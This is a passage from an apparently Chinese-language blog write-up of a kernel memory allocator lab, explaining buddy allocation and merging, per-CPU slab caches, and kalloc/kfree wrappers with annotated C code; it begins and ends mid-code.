class="type">uintptr_t</span>)(res + BUDDY_IDX2CHUNK_SIZE(iter)), *head = &amp;(buddys[iter]);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 初始化时，所有的chunks的idx被设置为CHUNKS_IDX_MASK</span></span><br><span class="line"><span class="comment">     *                       status被设置为CHUNKS_FLAG_UNUSE</span></span><br><span class="line"><span class="comment">      *                      FLAG被设置为CHUNKS_FLAG_SLAB</span></span><br><span class="line"><span class="comment">     * 因此需要更改</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    CHUNKS_SET_FLAG(chunk, CHUNKS_FLAG_BUDDY);</span><br><span class="line">    CHUNKS_SET_STATUS(chunk, CHUNKS_STATUS_UNUSE);</span><br><span class="line">    CHUNKS_SET_IDX(chunk, iter);</span><br><span class="line"></span><br><span class="line">    lock_acquire(&amp;(head-&gt;un.lock));</span><br><span class="line">    list_insert(chunk);</span><br><span class="line">    lock_release(&amp;(head-&gt;un.lock));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  CHUNKS_SET_IDX(res, idx);</span><br><span class="line">  CHUNKS_SET_STATUS(res, CHUNKS_STATUS_INUSE);</span><br><span class="line"></span><br><span class="line">  debug_pmm(<span class="string">&quot;buddys_alloc(%X) res:%X&quot;</span>, (<span class="type">uint64_t</span>)size, (<span class="type">uint64_t</span>)res);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (Chunk*)res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="释放内存"><a href="#释放内存" class="headerlink" title="释放内存"></a>释放内存</h4><p>  我们可以根据<strong>chunks</strong>获取当前待释放的内存对象的下标，因此我们可以将该chunk插入<strong>Buddy</strong>的表头数组的对应下标处的双向循环链表中即可<br>  但是需要注意的是，在<strong>Buddy</strong>算法中，释放内存对象时需要进行合并——如果相邻的内存对象大小相同，其是已经被释放的内存对象，并且也是从同一个更大的内存对象中拆分的:则将临接内存对象从双向循环链表中摘下来，合并成原始的大内存对象，然后继续按照上面的步骤释放该合并过的内存对象即可<br>  这里由于其拆分时是二分进行拆分的，因此寻找另一个被拆分的块可以通过异或快速进行定位，即<code>Chunk *another_chunk = (Chunk*)(((uintptr_t)chunk) ^ size);</code><br>  则根据上面的说明，<strong>Buddy</strong>算法的释放就是不断进行合并，直到内存对象没有可以合并的符合条件的相邻内存对象为止<br>  需要小心的就是数据竞争。有可能之类刚刚判断完当前大小的相邻的chunk正在使用，后脚其相邻的chunk就被释放入内存，从而导致没有正常合并<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 将内存释放到buddy中</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 注意一下，如果其是buddy_free，则其FLAG必然是CHUNKS_FLAG_BUDDY。</span></span><br><span class="line"><span class="comment"> * 而如果一个内存，其对应的CHUNKS_FLAG_SLAB，则其永远不可能成为BUDDY中的内存</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 在任何时候，chunks始终保存着其对应的大小信息，无论是在buddys中，亦或是在slabs中，还是已经分配出去的chunk</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 需要注意的是,buddys数组在释放的时候，如果条件合适的话，要进行合并</span></span><br><span class="line"><span class="comment"> * 1. 如果释放的是chunk1，则要释放的内存地址是chunk2 = chunk1 ^ size</span></span><br><span class="line"><span class="comment"> * 2. chunk1的FLAG和chunk2的FLAG都为CHUNKS_FLAG_BUDDY</span></span><br><span class="line"><span class="comment"> * 3. chunk1和chunk2的IDX相同</span></span><br><span class="line"><span class="comment"> * 4. chunk1和chunk2的STATUS都为CHUNKS_STATUS_UNUSE</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">buddys_free</span><span class="params">(Chunk *chunk)</span></span><br><span class="line">&#123;</span><br><span class="line">  panic_on(CHUNKS_GET_IDX(chunk) &gt;= chunks_size, <span class="string">&quot;error idx&quot;</span>);</span><br><span class="line">  panic_on(CHUNKS_GET_STATUS(chunk) != CHUNKS_STATUS_INUSE, <span class="string">&quot;error status&quot;</span>);</span><br><span class="line">  panic_on(CHUNKS_GET_FLAG(chunk) != CHUNKS_FLAG_BUDDY, <span class="string">&quot;error flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> idx = CHUNKS_GET_IDX(chunk);</span><br><span class="line">  Chunk *head = &amp;(buddys[idx]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * 这里需要注意的是，这里可能产生数据竞争</span></span><br><span class="line"><span class="comment">   * 因此，需要先获取当前下标对应的锁，避免两个chunk同时释放，或者一个刚刚判断完后，另一个chunk被申请走</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  lock_acquire(&amp;(head-&gt;un.lock));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 尝试合并相邻的buddys</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">while</span>(idx &lt; buddys_size - <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="type">uintptr_t</span> size = BUDDY_IDX2CHUNK_SIZE(idx);</span><br><span class="line">    Chunk *another_chunk = (Chunk*)(((<span class="type">uintptr_t</span>)chunk) ^ size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 如果不满足以下条件</span></span><br><span class="line"><span class="comment">     * 则说明另一个chunk不能进行合并</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>((CHUNKS_GET_IDX(another_chunk) != idx) || (CHUNKS_GET_STATUS(another_chunk) != CHUNKS_STATUS_UNUSE) || (CHUNKS_GET_FLAG(another_chunk) != CHUNKS_FLAG_BUDDY)) &#123; <span class="keyword">break</span>;&#125;</span><br><span class="line"></span><br><span class="line">    CHUNKS_SET_STATUS(another_chunk, CHUNKS_STATUS_INUSE);</span><br><span class="line">    list_remove(another_chunk);</span><br><span class="line">    lock_release(&amp;(head-&gt;un.lock));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    chunk = chunk &lt; another_chunk ? chunk : another_chunk;</span><br><span class="line">    idx += <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    head = &amp;(buddys[idx]);</span><br><span class="line">    lock_acquire(&amp;(head-&gt;un.lock));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  CHUNKS_SET_IDX(chunk, idx);</span><br><span class="line">  CHUNKS_SET_STATUS(chunk, CHUNKS_STATUS_UNUSE);</span><br><span class="line"></span><br><span class="line">  debug_pmm(<span class="string">&quot;buddys_free(%X) size:%X&quot;</span>, (<span class="type">uint64_t</span>)(<span class="type">uintptr_t</span>)chunk, (<span class="type">uint64_t</span>)(BUDDY_IDX2CHUNK_SIZE(CHUNKS_GET_IDX(chunk))));</span><br><span class="line"></span><br><span class="line">  list_insert(chunk);</span><br><span class="line">  lock_release(&amp;(head-&gt;un.lock));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="slab机制"><a href="#slab机制" class="headerlink" title="slab机制"></a>slab机制</h3><p>  如果我们需要分配小于<strong>PAGE_SIZE</strong>大小的内存时，我们则使用<strong>slab机制</strong>。<br>  其基本思想是通过<strong>Buddy</strong>算法申请一个页，然后将该页分割成对应大小(对齐后的请求大小)的<strong>chunk</strong>，然后进行分配和释放。<br>  分配时，如果上次分配有剩余，则直接使用该剩余进行分配即可;否则，首先通过<strong>buddys_malloc</strong>申请一个页，然后将该页分割成数个对齐过的请求大小的块。将一个块作为返回的内存对象，其余内存对象插入到双向链表，在每个CPU的单独结构中进行管理即可<br>  释放时，由于一个页被切割成相同大小的块，因此该块的信息和该内存地址对应的内存页在<strong>chunks</strong>元素的信息是完全相同的，从而可以知道该chunk的大小。在释放的时候，会根据其<strong>chunk</strong>大小，存放在每个CPU的slabs中。这里需要特别说明以下，为了提高效率，对于<strong>slab</strong>机制的页，在释放后不会进行合并——因为同一个页中的不同块可能是不同CPU进行释放的，如果进行合并，还可能涉及到<strong>数据竞争</strong>问题</p><h4 id="初始化slab机制"><a href="#初始化slab机制" class="headerlink" title="初始化slab机制"></a>初始化<strong>slab</strong>机制</h4><p>  正如前面所分析的，为了避免频繁的互斥，这里可以在每个CPU本地上提前准备一些频繁使用的相关大小的内存对象。在其申请的时候，则直接从这些内存对象中获取即可;释放的时候，则首先释放到该结构中。这样子，最大可能的避免了内存管理时的互斥操作。<br>  如果当前CPU中相关结构里没有符合条件的内存对象，则可以在周边的CPU结构中进行遍历即可——这里为了避免自旋锁导致耗时过多，就简单的上锁即可;如果失败了不进行重试。<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 初始化slabs数组</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 不同于buddys数组的初始化，其只需要需要初始化每一个cpu的slabs数组中的锁结构，以及其fd、bk值</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">slabs_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> cpu = <span class="number">0</span>; cpu &lt; cpu_count(); ++cpu) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> idx = <span class="number">0</span>; idx &lt; slabs_size; ++idx) &#123;</span><br><span class="line">      lock_init(&amp;(slabs[cpu][idx].un.lock));</span><br><span class="line">      slabs[cpu][idx].fd = slabs[cpu][idx].bk = &amp;(slabs[cpu][idx]);</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;slabs[%D][%D]: %X; slabs[%D][%D].fd: %X; slabs[%D][%D].bk: %X\n&quot;</span>, (<span class="type">uint64_t</span>)cpu, (<span class="type">uint64_t</span>)idx, (<span class="type">uint64_t</span>)(<span class="type">uintptr_t</span>)&amp;(slabs[cpu][idx]),</span><br><span class="line">        (<span class="type">uint64_t</span>)cpu, (<span class="type">uint64_t</span>)idx, (<span class="type">uint64_t</span>)(<span class="type">uintptr_t</span>)(slabs[cpu][idx].fd),</span><br><span class="line">        (<span class="type">uint64_t</span>)cpu, (<span class="type">uint64_t</span>)idx, (<span class="type">uint64_t</span>)(<span class="type">uintptr_t</span>)(slabs[cpu][idx].bk)</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;slabs_init\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="获取内存-1"><a href="#获取内存-1" class="headerlink" title="获取内存"></a>获取内存</h4><p>  对于<strong>slab</strong>机制申请的内存大小，其不能超过<strong>PAGE_SIZE</strong>，否则直接使用<strong>Buddy</strong>算法进行分配即可。<br>  首先，根据申请的大小，可以直接获取其<strong>slabs</strong>次序信息。然后，从本地CPU开始，遍历所有的CPU相关数据结构——如果其相关的<strong>slabs</strong>中包含有空闲的内存对象，则直接返回即可;否则继续遍历。这里需要注意的是，为了提高效率，这里的互斥并不是自旋锁实现的，即在上锁失败后不要进行重试。<br>  如果遍历完所有CPU相关数据仍然未成功分配内存，则使用<strong>Buddy</strong>算法申请一个页，并将其拆分成数个大小等于申请大小的<strong>chunk</strong>，取出一个进行分配，剩下的插入到对应的<strong>slabs</strong>中即可<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 即从slabs中分配内存</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 其size应该是已经对齐过，并且大于等于MINSIZE, 小于PAGESIZE的</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 分配的时候，从当前处理器开始，遍历的询问每一个处理器当前下标的slabs数组，如果存在则将其卸载，作为申请的内存即可</span></span><br><span class="line"><span class="comment"> * 如果都不存在的话，则向buddys申请一个PAGESIZE的内存，然后将其切分即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> Chunk *</span><br><span class="line"><span class="title function_">slabs_alloc</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> idx = SLAB_CHUNK_SIZE2IDX(size);</span><br><span class="line">  <span class="type">uintptr_t</span> res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  panic_on(size &lt; MINSIZE, <span class="string">&quot;size is too small&quot;</span>);</span><br><span class="line">  panic_on(size &gt;= PAGESIZE, <span class="string">&quot;size is too big&quot;</span>);</span><br><span class="line">  panic_on(SLAB_IDX2CHUNK_SIZE(idx) != size, <span class="string">&quot;size is invalid&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> cpu = cpu_current();</span><br><span class="line">  Chunk *head = &amp;(slabs[cpu][idx]);</span><br><span class="line">  <span class="keyword">do</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 如果是当前对应的cpu，则获取锁，然后进行遍历即可</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * 如果不是当前对应的cpu，需要注意的是，默认的情况是CPU主要从自己的slabs数组中获取，因此这里遍历的时候，不能阻塞获取锁，就尝试获取锁，</span></span><br><span class="line"><span class="comment">     * 如果获取成功就继续，否则遍历下一个即可</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>(cpu == cpu_current()) &#123; lock_acquire(&amp;(head-&gt;un.lock)); &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span>(lock_try_acquire(&amp;(head-&gt;un.lock)) == PMMLOCKED) &#123; <span class="keyword">goto</span> PREPARE_BEFORE_NEXT;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(head-&gt;fd != head) &#123;</span><br><span class="line">      res = (<span class="type">uintptr_t</span>)head-&gt;fd;</span><br><span class="line"></span><br><span class="line">      panic_on(CHUNKS_GET_IDX(res) != idx, <span class="string">&quot;error idx&quot;</span>);</span><br><span class="line">      panic_on(CHUNKS_GET_STATUS(res) != CHUNKS_STATUS_INUSE, <span class="string">&quot;error status&quot;</span>);</span><br><span class="line">      panic_on(CHUNKS_GET_FLAG(res) != CHUNKS_FLAG_SLAB, <span class="string">&quot;error flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">      list_remove((Chunk*)res);</span><br><span class="line">      lock_release(&amp;(head-&gt;un.lock));</span><br><span class="line">      <span class="keyword">return</span> (Chunk*)res;</span><br><span class="line">    &#125;</span><br><span class="line">    lock_release(&amp;(head-&gt;un.lock));</span><br><span class="line"></span><br><span class="line">    PREPARE_BEFORE_NEXT:</span><br><span class="line">      cpu = (cpu + <span class="number">1</span>) % cpu_count();</span><br><span class="line">      head = &amp;(slabs[cpu][idx]);</span><br><span class="line"></span><br><span class="line">  &#125;<span class="keyword">while</span>(cpu != cpu_current());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">//如果执行到此处，说明所有的cpu的slabs目前都没有可用的chunk，则直接从buddy中申请一块即可。切分的剩余的chunk，全部插入到当前cpu的slabs中即可</span></span><br><span class="line">  panic_on(res != <span class="number">0</span>, <span class="string">&quot;error res&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>((res = (<span class="type">uintptr_t</span>)buddys_alloc(PAGESIZE)) == <span class="number">0</span>) &#123; <span class="keyword">return</span> <span class="literal">NULL</span>; &#125;</span><br><span class="line">  panic_on(BUDDY_IDX2CHUNK_SIZE(CHUNKS_GET_IDX(res)) != PAGESIZE, <span class="string">&quot;error idx&quot;</span>);</span><br><span class="line">  panic_on(CHUNKS_GET_STATUS(res) != CHUNKS_STATUS_INUSE, <span class="string">&quot;error status&quot;</span>);</span><br><span class="line">  panic_on(CHUNKS_GET_FLAG(res) != CHUNKS_FLAG_BUDDY, <span class="string">&quot;error flag&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 更改chunks属性</span></span><br><span class="line"><span class="comment">   * 由于slabs不会进行合并，此处是永久性的改变</span></span><br><span class="line"><span class="comment">   * </span></span><br><span class="line"><span class="comment">   * 首先是flag，将其更改为CHUNKS_FLAG_SLAB</span></span><br><span class="line"><span class="comment">   * 对于idx，更改为idx即可</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  CHUNKS_SET_FLAG(res, CHUNKS_FLAG_SLAB);</span><br><span class="line">  CHUNKS_SET_IDX(res, idx);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 下面切割内存，并依次插入到slabs中即可</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * 注意，还需要将slabs_cpu_belongs_to字段设置为当前cpu</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="type">uintptr_t</span> gap = SLAB_IDX2CHUNK_SIZE(idx);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">uintptr_t</span> iter = gap; iter &lt; PAGESIZE; iter += gap) &#123;</span><br><span class="line">    Chunk *chunk = (Chunk*)(iter + res);</span><br><span class="line">    chunk-&gt;slabs_cpu_belongs_to = cpu;</span><br><span class="line">    lock_acquire(&amp;(head-&gt;un.lock));</span><br><span class="line">    list_insert(chunk);</span><br><span class="line">    lock_release(&amp;(head-&gt;un.lock));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  debug_pmm(<span class="string">&quot;slabs_alloc(%X) res:%X&quot;</span>, (<span class="type">uint64_t</span>)size, (<span class="type">uint64_t</span>)res);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (Chunk*)res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="释放内存-1"><a href="#释放内存-1" class="headerlink" title="释放内存"></a>释放内存</h4><p>  对于slab机制中的释放，由于其不会将slab中所有的chunk重新进行合并，因此其释放非常简单——直接插入到当前CPU的<strong>Slab_Per_Cpu</strong>中的链表中即可。<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 将内存释放到slabs中</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 注意一下，如果其是slabs_free，则其FLAG必然是CHUNKS_FLAG_SLABS。</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 在任何时候，chunks始终保存着其对应的大小信息，无论是在buddys中，亦或是在slabs中，还是已经分配出去的chunk</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 与buddys不同的是，其需要设置slabs_cpu_belongs_to字段</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">slabs_free</span><span class="params">(Chunk *chunk)</span></span><br><span class="line">&#123;</span><br><span class="line">  panic_on(CHUNKS_GET_IDX(chunk) &gt;= slabs_size, <span class="string">&quot;error idx&quot;</span>);</span><br><span class="line">  panic_on(CHUNKS_GET_STATUS(chunk) != CHUNKS_STATUS_INUSE, <span class="string">&quot;error status&quot;</span>);</span><br><span class="line">  panic_on(CHUNKS_GET_FLAG(chunk) != CHUNKS_FLAG_SLAB, <span class="string">&quot;error flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">  debug_pmm(<span class="string">&quot;slabs_free(%X) size:%X&quot;</span>, (<span class="type">uint64_t</span>)(<span class="type">uintptr_t</span>)chunk, (<span class="type">uint64_t</span>)(SLAB_IDX2CHUNK_SIZE(CHUNKS_GET_IDX(chunk))));</span><br><span class="line"></span><br><span class="line">  chunk-&gt;slabs_cpu_belongs_to = cpu_current();</span><br><span class="line">  Chunk *head = &amp;(slabs[cpu_current()][CHUNKS_GET_IDX(chunk)]);</span><br><span class="line">  lock_acquire(&amp;(head-&gt;un.lock));</span><br><span class="line">  list_insert(chunk);</span><br><span class="line">  lock_release(&amp;(head-&gt;un.lock));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="kalloc和kfree"><a href="#kalloc和kfree" class="headerlink" title="kalloc和kfree"></a><code>kalloc</code>和<code>kfree</code></h3><p>  实际上，这两个只不过是分别对于<code>buddys_malloc</code>和<code>slabs_malloc</code>、<code>buddys_free</code>和<code>slabs_free</code>的包装而已。<br>  对于<code>kalloc</code>来说，其根据申请的内存大小的不同，分别调用<code>buddys_malloc</code>或<code>slabs_malloc</code>——如果对齐后的内存大小小于<strong>PAGE_SIZE</strong>，则调用<code>slabs_malloc</code>即可;否则，直接调用<code>buddys_malloc</code>进行申请<br>  对于<code>kfree</code>来说，其根据<strong>chunks</strong>提供的宏进行判断——如果是<strong>slabs</strong>对应的的内存对象，则通过<code>slabs_free</code>进行释放即可;否则，需要通过<code>buddys_free</code>进行释放<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">kalloc</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(size &gt; MAXSIZE) &#123; <span class="keyword">return</span> <span class="literal">NULL</span>; &#125;</span><br><span class="line">  <span class="keyword">if</span>(size &lt; MINSIZE) &#123; size = MINSIZE; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> size_align = request_size2mem_size(size);</span><br><span class="line"></span><br><span class="line">  panic_on(size_align &lt; MINSIZE, <span class="string">&quot;size is too small&quot;</span>);</span><br><span class="line">  panic_on(size_align &gt; MAXSIZE, <span class="string">&quot;size is too big&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *res = size_align &lt; PAGESIZE ? slabs_alloc(size_align) : buddys_alloc(size_align);</span><br><span class="line"></span><br><span class="line">  debug_pmm(<span class="string">&quot;kalloc(%X) = %X&quot;</span>, (<span class="type">uint64_t</span>)size, (<span class="type">uint64_t</span>)(<span class="type">uintptr_t</span>)res);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">kfree</span><span class="params">(<span class="type">void</span> *ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(ptr == <span class="literal">NULL</span>) &#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">  panic_on((<span class="type">uintptr_t</span>)ptr &gt; (<span class="type">uintptr_t</span>)heap.end, <span class="string">&quot;invalid ptr&quot;</span>);</span><br><span class="line">  panic_on((<span class="type">uintptr_t</span>)ptr &lt; (<span class="type">uintptr_t</span>)chunks_base, <span class="string">&quot;invalid ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (CHUNKS_GET_FLAG(ptr))</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">case</span> CHUNKS_FLAG_BUDDY:</span><br><span class="line">    buddys_free(ptr);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">case</span> CHUNKS_FLAG_SLAB:</span><br><span class="line">    slabs_free(ptr);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    panic(<span class="string">&quot;error 